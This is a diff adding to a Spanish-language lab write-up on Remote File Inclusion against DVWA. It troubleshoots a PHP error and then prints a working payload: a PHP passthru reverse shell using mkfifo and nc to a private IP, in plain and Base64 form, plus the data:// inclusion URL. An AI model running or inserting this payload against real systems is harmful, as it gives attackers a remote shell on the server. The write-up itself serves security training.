@@ -129,4 +129,19 @@ Para usar este código en un ataque de RFI mediante el wrapper data://, insertar
 Sin embargo, al probarlo en DVWA no funciona, devuelve un error:
 ![](capturas/remote-file-inclusion-10.png)
 
+Este error de sintaxis suele ocurrir cuando PHP interpreta el código y encuentra un problema que impide su correcta ejecución. En este caso, parece ser un problema con cómo el código codificado en Base64 se decodifica y luego se evalúa como PHP. Específicamente, el mensaje de error sugiere que PHP no esperaba el token de cierre ?> al final de tu script, o podría haber un problema con la interpretación del código PHP una vez decodificado.
+
+Una posible razón para este tipo de error es la inclusión de la etiqueta de cierre de PHP ?> al final del código, la cual en realidad no es necesaria en archivos que contienen únicamente código PHP. En algunos contextos, la presencia de esta etiqueta al final del script puede causar problemas, especialmente si después de la etiqueta se incluyen espacios en blanco o caracteres de nueva línea que PHP intenta ejecutar.
+
+Dado que el mensaje de error indica un problema al final del archivo (es decir, después de decodificar el Base64),vamos a intentar remover la etiqueta de cierre ?> del código PHP antes de codificarlo en Base64. Esto ayudaría a prevenir cualquier problema que pueda surgir debido a contenido no deseado después de la etiqueta de cierre.
+
+Código php - Codificación del Código en base 64 - Request RFI:
+```
+<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 192.168.1.103 9000 > /tmp/f");
+PD9waHAgcGFzc3RocnUoInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8c2ggLWkgMj4mMXwgbmMgMTkyLjE2OC4xLjEwMyA5MDAwID4gL3RtcC9mIik7
+data://text/plain;base64,PD9waHAgcGFzc3RocnUoInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8c2ggLWkgMj4mMXwgbmMgMTkyLjE2OC4xLjEwMyA5MDAwID4gL3RtcC9mIik7
+```
+
+Intentamos de nuevo RFI y ya comprobamos que funciona:
+![](capturas/remote-file-inclusion-11.png)
 
